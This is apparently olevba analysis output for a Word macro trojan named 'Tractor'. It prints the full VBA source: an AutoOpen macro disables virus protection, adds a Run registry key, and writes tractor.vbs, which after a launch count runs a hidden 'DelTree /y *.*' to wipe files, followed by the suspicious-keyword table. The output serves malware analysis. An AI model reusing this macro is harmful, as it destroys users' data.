olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Tractor-c9ab2a05a2e083b70e594608870297859de5b5ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Tractor-c9ab2a05a2e083b70e594608870297859de5b5ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.Tractor-c9ab2a05a2e083b70e594608870297859de5b5ab - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Trojan.Tractor_Driver"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
On Error Resume Next
Options.VirusProtection = False
Set regedit = CreateObject("wscript.shell")
Set fso = CreateObject("scripting.filesystemobject")
wdir = fso.getspecialfolder(windowsfolder)
If regedit.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\TRACTOR") <> wdir + "\tractor.vbs" Then
regedit.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\TRACTOR", wdir + "\tractor.vbs"
fso.createtextfile wdir + "\tractor.vbs", True
Set f1 = fso.opentextfile(wdir + "\tractor.vbs", 2, True)
f1.writeline "'TRACTOR DRIVER V 1.3 beta"
f1.writeline "On Error Resume Next"
f1.writeline "Set regedit = CreateObject(""wscript.shell"")"
f1.writeline "Set WshShell = wscript.CreateObject(""Wscript.Shell"")"
f1.writeline "If regedit.regread(""HKEY_CURRENT_USER\TRACTOR\"") <> ""xfuck"" Then"
f1.writeline "regedit.regwrite ""HKEY_CURRENT_USER\TRACTOR\"", ""xfuck"""
f1.writeline "regedit.regwrite ""HKEY_CURRENT_USER\TRACTOR\cnt\"", 0"
f1.writeline "Else"
f1.writeline "Count = regedit.regread(""HKEY_CURRENT_USER\TRACTOR\cnt\"")"
f1.writeline "If Count = 4 Then"
f1.writeline "Bomb"
f1.writeline "Else"
f1.writeline "Count = Count + 1"
f1.writeline "regedit.regwrite ""HKEY_CURRENT_USER\TRACTOR\cnt\"", Count"
f1.writeline "End If"
f1.writeline "End If"
f1.writeline "Sub Bomb()"
f1.writeline "On Error Resume Next"
f1.writeline "WshShell.Run ""DelTree /y *.* >null"", vbHide"
f1.writeline "MsgBox ""Furious Tractor Driver has just destroyed your DATA. HA-Ha-Ha-haha"""
f1.writeline "End Sub"
f1.Close
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|regread             |May read registry keys                       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tractor.vbs         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

